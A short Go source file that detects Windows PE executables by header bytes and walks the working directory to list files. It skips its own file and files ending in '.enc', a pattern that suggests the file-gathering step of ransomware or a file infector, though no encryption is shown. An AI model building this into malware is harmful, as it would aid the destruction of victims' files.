package fileSystem

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
)

func BytesToUint32(b []byte) uint32 {
	_ = b[3]
	return uint32(b[0]) | uint32(b[1])<<8 | uint32(b[2])<<16 | uint32(b[3])<<24
}

func get_ntHeader(fd *os.File) (ne_offset uint32) {
	var data = make([]byte, 4)
	fd.Seek(0x3c, 0)
	fd.Read(data)
	ne_offset = BytesToUint32(data)
	return ne_offset
}

func isPE(filename string) bool {
	fd, _ := os.Open(filename)
	defer fd.Close()
	fd.Seek(0, 0)
	data := make([]byte, 4)
	n, _ := fd.Read(data)
	if n == 4 {
		if !bytes.Equal(data, []byte{0x4D, 0x5A, 0x90, 0x00}) {
			return false
		}
	}
	nt_offset := get_ntHeader(fd)
	fd.Seek(int64(nt_offset), 0)
	data = make([]byte, 4)
	n, _ = fd.Read(data)
	if n == 4 {
		if bytes.Equal(data, []byte{0x50, 0x45, 0x00, 0x00}) {
			return true
		}
	}
	return false
}

func GetAllFile(itself string) (files1 []string, files2 []string) {
	pwd, _ := os.Getwd()

	filepath.Walk(pwd, func(path string, info os.FileInfo, err error) error {
		ok1 := strings.HasSuffix(path, itself)
		ok2 := strings.HasSuffix(path, ".enc")
		if !ok1 && !ok2 {
			s, _ := os.Stat(path)
			if !s.IsDir() {
				if isPE(path) {
					files2 = append(files2, path)
				}
				files1 = append(files1, path)
			}
		}
		return nil
	})

	return files1, files2
}
